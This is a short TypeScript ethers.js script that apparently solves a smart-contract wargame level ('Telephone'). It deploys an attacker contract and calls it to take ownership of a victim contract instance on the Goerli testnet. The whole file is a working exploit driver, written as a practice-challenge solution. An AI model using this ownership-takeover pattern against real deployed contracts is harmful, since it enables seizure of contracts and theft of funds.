import { ethers } from "ethers";
import * as fs from 'fs';
import { Telephone__factory, TelephoneAttacker__factory } from '../typechain-types';

// Task: claim ownership of the contract

const rpc = 'https://rpc.ankr.com/eth_goerli'
const privateKey = ''
const instanceAddress = ''

const main = async () =>  {
    let tx;
  
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    const metadata = JSON.parse(fs.readFileSync('./artifacts/contracts/attackers/TelephoneAttacker.sol/TelephoneAttacker.json').toString());
    const factory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer);
    const contract = await factory.deploy();
    await contract.deploymentTransaction()?.wait();

    const attackerAddress = await contract.getAddress();
    const attacker = TelephoneAttacker__factory.connect(attackerAddress, signer);
    const victim = Telephone__factory.connect(instanceAddress, signer);

    console.log("Hacking the contract...");

    tx = await attacker.connect(signer).attack(instanceAddress, signer);
    await tx.wait();

    const owner = await victim.owner();

    console.log("Successfully hacked!");
    console.log("Contract owner:", owner);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});